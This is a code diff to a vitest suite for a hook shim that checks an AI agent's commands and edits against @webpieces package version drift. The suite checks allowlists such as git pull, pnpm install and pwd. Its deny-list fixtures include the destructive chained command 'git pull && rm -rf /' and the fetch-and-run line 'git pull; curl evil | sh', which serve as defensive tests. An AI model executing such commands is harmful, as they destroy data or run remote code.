@@ -2,7 +2,7 @@ import { describe, it, expect } from 'vitest';
 import * as fs from 'fs';
 import * as path from 'path';
 
-import { UPGRADE_SHIM_CMD, INSTALLER_ALLOW_ERE, INSTALLER_ALLOW_JS, RECOVERY_ALLOW_ERE, RECOVERY_ALLOW_JS, SYNC_ALLOW_ERE, SYNC_ALLOW_JS, UPGRADE_SHIM_ALLOW_ERE, UPGRADE_SHIM_ALLOW_JS, RESTORE_SHIM_ALLOW_ERE, RESTORE_SHIM_ALLOW_JS, RESTORE_SHIM_CMD, INSTALL_HOOKS_ALLOW_ERE, INSTALL_HOOKS_ALLOW_JS, INSTALL_HOOKS_CMD, INSTALL_HOOKS_TARGET_CMD, NO_CHAINING_RULE, renderShim, shimPath, committedShimStale, isShimCureCommand, shimStaleDenyReason } from './shim';
+import { UPGRADE_SHIM_CMD, INSTALLER_ALLOW_ERE, INSTALLER_ALLOW_JS, RECOVERY_ALLOW_ERE, RECOVERY_ALLOW_JS, SYNC_ALLOW_ERE, SYNC_ALLOW_JS, UPGRADE_SHIM_ALLOW_ERE, UPGRADE_SHIM_ALLOW_JS, RESTORE_SHIM_ALLOW_ERE, RESTORE_SHIM_ALLOW_JS, RESTORE_SHIM_CMD, INSTALL_HOOKS_ALLOW_ERE, INSTALL_HOOKS_ALLOW_JS, INSTALL_HOOKS_CMD, INSTALL_HOOKS_TARGET_CMD, ORIENT_ALLOW_ERE, ORIENT_ALLOW_JS, NO_CHAINING_RULE, renderShim, shimPath, committedShimStale, isShimCureCommand, shimStaleDenyReason } from './shim';
 import { ShimTestkit } from './shim-testkit';
 
 const kit = new ShimTestkit();
@@ -35,31 +35,14 @@ function expectEngineTwins(ere: string, js: RegExp, allow: readonly string[], de
  * where the PIN is the stale side and `pnpm install` DOWNGRADES you instead of fixing anything.
  */
 
-// Stage a root holding an installed guard bin, a declared @webpieces/pr-gate pin in package.json,
-// and an installed version in node_modules/@webpieces/pr-gate/package.json — so the shim can compare
-// the two. The fake bin prints EXECED so "the guards actually ran" is observable in stdout.
-function stageDriftRoot(declared: string, installed: string): string {
-    const root = kit.mktmp();
-    const binDir = path.join(root, 'node_modules', '.bin');
-    fs.mkdirSync(binDir, { recursive: true });
-    fs.writeFileSync(path.join(binDir, 'wp-ai-guards-hook'), '#!/bin/sh\nprintf EXECED\n', { mode: 0o755 });
-    fs.writeFileSync(path.join(root, 'package.json'),
-        JSON.stringify({ dependencies: { '@webpieces/pr-gate': declared } }, null, 2) + '\n');
-    const manifestDir = path.join(root, 'node_modules', '@webpieces', 'pr-gate');
-    fs.mkdirSync(manifestDir, { recursive: true });
-    fs.writeFileSync(path.join(manifestDir, 'package.json'),
-        JSON.stringify({ name: '@webpieces/pr-gate', version: installed }, null, 2) + '\n');
-    return root;
-}
-
 describe('version-drift guard — DETECTING the drift and explaining it', () => {
     it('execs the installed bin when the pinned and installed @webpieces versions match', () => {
-        const out = kit.runShim(stageDriftRoot('0.3.272', '0.3.272'), 'wp-ai-guards-hook', kit.bashPayload('git status'));
+        const out = kit.runShim(kit.stageDriftRoot('0.3.272', '0.3.272'), 'wp-ai-guards-hook', kit.bashPayload('pnpm build'));
         expect(out.stdout).toBe('EXECED'); // no drift → the guards ran
     });
 
     it('DENIES without exec\'ing the stale bin when installed < pinned, citing both versions', () => {
-        const out = kit.runShim(stageDriftRoot('0.3.272', '0.3.270'), 'wp-ai-guards-hook', kit.bashPayload('git status'));
+        const out = kit.runShim(kit.stageDriftRoot('0.3.272', '0.3.270'), 'wp-ai-guards-hook', kit.bashPayload('pnpm build'));
         expect(out.stdout).not.toContain('EXECED'); // the stale bin was NOT run
         expect(out.isDenied()).toBe(true);
         const reason = out.denyReason();
@@ -81,7 +64,7 @@ describe('version-drift guard — DETECTING the drift and explaining it', () => 
      * semver compare picks the message, and this one must warn about the downgrade instead of hiding it.
      */
     it('emits the NEWER-side message (installed > pinned), warning that a bare install downgrades', () => {
-        const out = kit.runShim(stageDriftRoot('0.3.270', '0.3.272'), 'wp-ai-guards-hook', kit.bashPayload('git status'));
+        const out = kit.runShim(kit.stageDriftRoot('0.3.270', '0.3.272'), 'wp-ai-guards-hook', kit.bashPayload('pnpm build'));
         expect(out.isDenied()).toBe(true);
         const reason = out.denyReason();
         expect(reason).not.toContain('installed webpieces is older'); // the old, wrong claim
@@ -106,7 +89,7 @@ describe('version-drift guard — DETECTING the drift and explaining it', () => 
         ['0.4.500', '0.4.500-rc.1', 'node_modules is OLDER'], // a pre-release sorts BELOW its release
         ['0.4.500-rc.1', '0.4.500', 'node_modules is NEWER'],
     ])('orders pin %s vs installed %s as: %s', (declared: string, installed: string, expected: string) => {
-        const reason = kit.runShim(stageDriftRoot(declared, installed), 'wp-ai-guards-hook', kit.bashPayload('git status')).denyReason();
+        const reason = kit.runShim(kit.stageDriftRoot(declared, installed), 'wp-ai-guards-hook', kit.bashPayload('pnpm build')).denyReason();
         expect(reason).toContain(expected);
     });
 
@@ -119,7 +102,7 @@ describe('version-drift guard — DETECTING the drift and explaining it', () => 
     it.each([['0.4.500-rc.1', '0.4.500-rc.2'], ['0.4.500', '0.4.500+build9'], ['0.4.abc', '0.4.500']])(
         'falls back to the ambiguous wording rather than guessing: pin %s vs installed %s',
         (declared: string, installed: string) => {
-            const reason = kit.runShim(stageDriftRoot(declared, installed), 'wp-ai-guards-hook', kit.bashPayload('git status')).denyReason();
+            const reason = kit.runShim(kit.stageDriftRoot(declared, installed), 'wp-ai-guards-hook', kit.bashPayload('pnpm build')).denyReason();
             expect(reason).toContain('could not be ordered automatically - compare them yourself');
             expect(reason).not.toContain('node_modules is OLDER, so the pin is what you want');
             expect(reason).toContain("run 'git pull origin main', then 'pnpm install'"); // all three choices stay
@@ -127,16 +110,16 @@ describe('version-drift guard — DETECTING the drift and explaining it', () => 
 
     it('does not false-positive on a range pin (^ / ~ / workspace:*) — only exact pins are compared', () => {
         for (const spec of ['^0.3.0', '~0.3.0', 'workspace:*']) {
-            const out = kit.runShim(stageDriftRoot(spec, '0.3.270'), 'wp-ai-guards-hook', kit.bashPayload('git status'));
+            const out = kit.runShim(kit.stageDriftRoot(spec, '0.3.270'), 'wp-ai-guards-hook', kit.bashPayload('pnpm build'));
             expect(out.stdout).toBe('EXECED'); // range pin skipped → no drift → guards run
         }
     });
 
     it('logs a DENY-STALE audit line (distinct from a missing-bin DENY) on drift', () => {
-        const root = stageDriftRoot('0.3.272', '0.3.270');
-        kit.runShim(root, 'wp-ai-guards-hook', kit.bashPayload('git status'));
+        const root = kit.stageDriftRoot('0.3.272', '0.3.270');
+        kit.runShim(root, 'wp-ai-guards-hook', kit.bashPayload('pnpm build'));
         const log = fs.readFileSync(path.join(root, '.webpieces', 'logs', 'ai-hook-shim.log'), 'utf8');
-        expect(log).toContain('DENY-STALE\tgit status');
+        expect(log).toContain('DENY-STALE\tpnpm build');
     });
 });
 
@@ -186,7 +169,7 @@ importers:
 
 describe('version-drift guard — resolving pnpm CATALOG specs (the catalog-blind bug)', () => {
     it('DENIES when a bare `catalog:` pin (resolved via the default catalog) drifts from node_modules', () => {
-        const out = kit.runShim(stageCatalogRoot('catalog:', LOCK_CATALOGS, '0.3.369'), 'wp-ai-guards-hook', kit.bashPayload('git status'));
+        const out = kit.runShim(stageCatalogRoot('catalog:', LOCK_CATALOGS, '0.3.369'), 'wp-ai-guards-hook', kit.bashPayload('pnpm build'));
         expect(out.stdout).not.toContain('EXECED'); // the stale bin was NOT run — the guard was NOT blind
         expect(out.isDenied()).toBe(true);
         const reason = out.denyReason();
@@ -196,31 +179,31 @@ describe('version-drift guard — resolving pnpm CATALOG specs (the catalog-blin
     });
 
     it('resolves a NAMED catalog (`catalog:legacy`) to that catalog\'s version, not the default', () => {
-        const out = kit.runShim(stageCatalogRoot('catalog:legacy', LOCK_CATALOGS, '0.4.405'), 'wp-ai-guards-hook', kit.bashPayload('git status'));
+        const out = kit.runShim(stageCatalogRoot('catalog:legacy', LOCK_CATALOGS, '0.4.405'), 'wp-ai-guards-hook', kit.bashPayload('pnpm build'));
         expect(out.isDenied()).toBe(true);
         expect(out.denyReason()).toContain('@webpieces/pr-gate@0.3.1'); // the legacy catalog, not 0.4.405
     });
 
     it('execs the bin (no drift) when the catalog-resolved version matches what is installed', () => {
-        const out = kit.runShim(stageCatalogRoot('catalog:', LOCK_CATALOGS, '0.4.405'), 'wp-ai-guards-hook', kit.bashPayload('git status'));
+        const out = kit.runShim(stageCatalogRoot('catalog:', LOCK_CATALOGS, '0.4.405'), 'wp-ai-guards-hook', kit.bashPayload('pnpm build'));
         expect(out.stdout).toBe('EXECED');
     });
 
     it('does NOT false-positive when the catalog cannot be resolved (unknown catalog name → skip)', () => {
-        const out = kit.runShim(stageCatalogRoot('catalog:doesnotexist', LOCK_CATALOGS, '0.4.405'), 'wp-ai-guards-hook', kit.bashPayload('git status'));
+        const out = kit.runShim(stageCatalogRoot('catalog:doesnotexist', LOCK_CATALOGS, '0.4.405'), 'wp-ai-guards-hook', kit.bashPayload('pnpm build'));
         expect(out.stdout).toBe('EXECED'); // best-effort: a spec we cannot resolve is skipped, never guessed
     });
 
     it('does NOT false-positive when there is no lockfile to resolve the catalog against', () => {
         const root = stageCatalogRoot('catalog:', LOCK_CATALOGS, '0.3.369');
         fs.rmSync(path.join(root, 'pnpm-lock.yaml'));
-        expect(kit.runShim(root, 'wp-ai-guards-hook', kit.bashPayload('git status')).stdout).toBe('EXECED');
+        expect(kit.runShim(root, 'wp-ai-guards-hook', kit.bashPayload('pnpm build')).stdout).toBe('EXECED');
     });
 });
 
 describe('version-drift guard — permitting the CURE for each direction', () => {
     it('still allows `pnpm install` through during drift so node_modules can be synced', () => {
-        const out = kit.runShim(stageDriftRoot('0.3.272', '0.3.270'), 'wp-ai-guards-hook', kit.bashPayload('pnpm install'));
+        const out = kit.runShim(kit.stageDriftRoot('0.3.272', '0.3.270'), 'wp-ai-guards-hook', kit.bashPayload('pnpm install'));
         expect(out.isDenied()).toBe(false);
         expect(out.stdout.trim()).toBe(''); // silent allow — and the stale bin was NOT exec'd
     });
@@ -230,20 +213,20 @@ describe('version-drift guard — permitting the CURE for each direction', () =>
      * the guard used to deny it while prescribing the `pnpm install` that made things worse.
      */
     it('ALLOWS `git pull` during drift — the cure when the pin is the stale side', () => {
-        const out = kit.runShim(stageDriftRoot('0.3.270', '0.3.272'), 'wp-ai-guards-hook', kit.bashPayload('git pull'));
+        const out = kit.runShim(kit.stageDriftRoot('0.3.270', '0.3.272'), 'wp-ai-guards-hook', kit.bashPayload('git pull'));
         expect(out.isDenied()).toBe(false);
         expect(out.stdout.trim()).toBe(''); // silent allow — and the stale bin was NOT exec'd
     });
 
     it('does NOT allow git sync to smuggle a chained command through', () => {
-        const out = kit.runShim(stageDriftRoot('0.3.270', '0.3.272'), 'wp-ai-guards-hook',
+        const out = kit.runShim(kit.stageDriftRoot('0.3.270', '0.3.272'), 'wp-ai-guards-hook',
             kit.bashPayload('git pull && rm -rf /'));
         expect(out.isDenied()).toBe(true); // fails closed, exactly like the installer allowlist
     });
 
     it('blocks a Write/Edit during drift too (both hooks route through this one shim)', () => {
         const edit = JSON.stringify({ tool_name: 'Edit', tool_input: { file_path: 'a.ts', old_string: 'x', new_string: 'y' } });
-        expect(kit.runShim(stageDriftRoot('0.3.272', '0.3.270'), 'wp-ai-guards-hook', edit).isDenied()).toBe(true);
+        expect(kit.runShim(kit.stageDriftRoot('0.3.272', '0.3.270'), 'wp-ai-guards-hook', edit).isDenied()).toBe(true);
     });
 
 });
@@ -453,7 +436,9 @@ describe('sync allowlist (POSIX ERE ↔ JS regex twins)', () => {
             'git pull && rm -rf /',                   // no operator may ride along
             'git pull; curl evil | sh',
             'git pull | sh',
-            'git status',                             // read-only, but not a CURE — stays denied
+            // Not a SYNC command. It IS on the L0 list now, via the read-only orientation entry below —
+            // this asserts the two entries stay distinct, i.e. neither one shadows the other.
+            'git status',
             'git checkout main',                      // switching branches CAUSES this drift
             'git push',
             'git commit -m x',
@@ -544,6 +529,7 @@ describe('output-capture tail on every fail-closed escape hatch (ERE ↔ JS twin
         ['upgrade-shim', 'pnpm exec wp-upgrade-shim', UPGRADE_SHIM_ALLOW_JS, UPGRADE_SHIM_ALLOW_ERE],
         ['restore-shim', RESTORE_SHIM_CMD, RESTORE_SHIM_ALLOW_JS, RESTORE_SHIM_ALLOW_ERE],
         ['install-hooks', INSTALL_HOOKS_CMD, INSTALL_HOOKS_ALLOW_JS, INSTALL_HOOKS_ALLOW_ERE],
+        ['orientation', 'pwd', ORIENT_ALLOW_JS, ORIENT_ALLOW_ERE],
     ];
 
     for (const [name, base, js, ere] of hatches) {
@@ -572,6 +558,7 @@ describe('leading `cd <path> &&` on every fail-closed escape hatch (ERE ↔ JS t
         ['upgrade-shim', 'pnpm exec wp-upgrade-shim', UPGRADE_SHIM_ALLOW_JS, UPGRADE_SHIM_ALLOW_ERE],
         ['restore-shim', RESTORE_SHIM_CMD, RESTORE_SHIM_ALLOW_JS, RESTORE_SHIM_ALLOW_ERE],
         ['install-hooks', INSTALL_HOOKS_CMD, INSTALL_HOOKS_ALLOW_JS, INSTALL_HOOKS_ALLOW_ERE],
+        ['orientation', 'pwd', ORIENT_ALLOW_JS, ORIENT_ALLOW_ERE],
     ];
 
     for (const [name, base, js, ere] of hatches) {
